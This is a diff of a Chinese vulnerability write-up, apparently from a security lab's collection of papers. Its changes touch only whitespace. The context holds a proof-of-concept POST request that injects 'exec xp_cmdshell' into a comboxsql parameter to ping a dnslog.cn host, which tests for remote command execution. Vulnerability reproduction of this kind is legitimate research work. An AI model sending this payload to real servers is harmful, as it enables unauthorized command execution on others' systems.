@@ -55,7 +55,7 @@ source: "MrWQ/vulnerability-paper"
 
 2. 对漏洞进行复现
 
- **POC （POST）**
+ **POC （POST）**
 
 ```
 POST /mainFunctions/comboxstore.action HTTP/1.1
@@ -70,7 +70,7 @@ comboxsql=exec%20xp_cmdshell%20'ping%20cbjths.dnslog.cn'
 
 ```
 
-     漏洞复现，访问一下地址有数据返回，则可能存在漏洞
+     漏洞复现，访问一下地址有数据返回，则可能存在漏洞
 
 ```
 http://127.0.0.1:8082/mainFunctions/comboxstore.action
@@ -79,7 +79,7 @@ http://127.0.0.1:8082/mainFunctions/comboxstore.action
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCS28xmtFLC4kUtlpOm3UjmPLdl6dLicj1VtiapPAKJsXfTPsSZxhaOLDM3icmdaBGvLBiaPwslLM1g6w/640?wx_fmt=png)
 
-       通过 DNSlog 进行 RCE 测试。
+       通过 DNSlog 进行 RCE 测试。
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCS28xmtFLC4kUtlpOm3UjmqvA0GzJkkohnoIibMSsPzCDgguicicfR1zTdDaYwp8W4EyANSxYBXbHzg/640?wx_fmt=png)
 
@@ -105,7 +105,7 @@ https://mp.weixin.qq.com/s/v6qkGlN7AuecoD-aVDE9eQ
 
 口号 网安引领时代，弥天点亮未来
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 
+![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 
 
 知识分享完了
 
@@ -117,7 +117,7 @@ https://mp.weixin.qq.com/s/v6qkGlN7AuecoD-aVDE9eQ
 
 必降弥天之润！
 
-   弥  天
+   弥  天
 
 安全实验室  
 
